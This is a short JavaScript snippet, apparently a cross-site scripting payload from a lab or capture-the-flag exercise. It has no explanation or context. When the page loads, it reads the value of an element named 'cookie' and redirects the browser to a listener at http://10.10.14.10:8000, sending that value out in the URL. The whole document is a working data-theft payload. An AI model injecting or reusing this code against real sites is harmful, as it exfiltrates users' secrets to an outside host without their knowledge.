window.addEventListener('DOMContentLoaded', function(e) {
	     window.location = "http://10.10.14.10:8000/?cookie=" + encodeURI(document.getElementsByName("cookie")[0].value)
 })

